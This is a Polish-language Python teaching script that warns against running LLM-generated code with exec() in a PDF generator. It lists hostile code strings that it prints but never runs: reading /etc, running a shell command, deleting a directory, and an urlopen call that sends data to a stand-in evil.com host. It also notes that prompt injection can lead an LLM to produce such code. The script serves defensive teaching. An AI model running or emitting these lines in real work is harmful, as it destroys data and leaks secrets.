"""Demo bezpieczenstwa -- dlaczego exec() z niezaufanym inputem jest niebezpieczne.

NIE ODPALAJ TEGO BEZ GLOWY. Pokazuje ryzyko, niczego nie exploituje.
"""

import io

# === BEZPIECZNE: Co nasz generator PDF robi ===
safe_code = '''
def create_pdf_content(buffer):
    """To powinien generowac LLM -- bezpieczny kod ReportLab."""
    from reportlab.lib.pagesizes import A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph
    from reportlab.lib.styles import getSampleStyleSheet

    doc = SimpleDocTemplate(buffer, pagesize=A4)
    styles = getSampleStyleSheet()
    story = [Paragraph("Hello, this is a safe PDF!", styles["Title"])]
    doc.build(story)
'''

print("=== BEZPIECZNY KOD ===")
print(safe_code)
print("To jest ok -- uzywa tylko ReportLab do budowania PDF.")

# === NIEBEZPIECZNE: Co zlosliwy LLM (albo wstrzykniety prompt) moze wygenerowac ===
dangerous_examples = [
    '# Czytanie wrazliwych plikow\nimport os; print(os.listdir("/etc"))',
    '# Wykonywanie komend shell\nimport subprocess; subprocess.run(["whoami"])',
    '# Usuwanie plikow\nimport shutil; shutil.rmtree("/tmp/important_data")',
    '# Wyciaganie danych\nimport urllib.request; urllib.request.urlopen("https://evil.com/steal?data=...")',
]

print("\n=== NIEBEZPIECZNE PRZYKLADY KODU (NIE WYKONANE) ===")
for i, code in enumerate(dangerous_examples, 1):
    print(f"\n{i}. {code}")

print("\n" + "=" * 60)
print("KLUCZOWY WNIOSEK:")
print("exec() wykonuje DOWOLNY kod Pythona. Jesli LLM wygeneruje zlosliwy kod,")
print("albo jesli user prompt-injectuje LLM-a zeby go wygenerował,")
print("twoj serwer wykona go z pelnymi uprawnieniami.")
print()
print("Na potrzeby tego kursu: akceptowalne ryzyko (twoj laptop, twoj kod).")
print("Na produkcji: uzywaj strukturyzowanych danych + szablonow, sandboxingu,")
print("albo ograniczonego srodowiska wykonawczego.")
print("=" * 60)
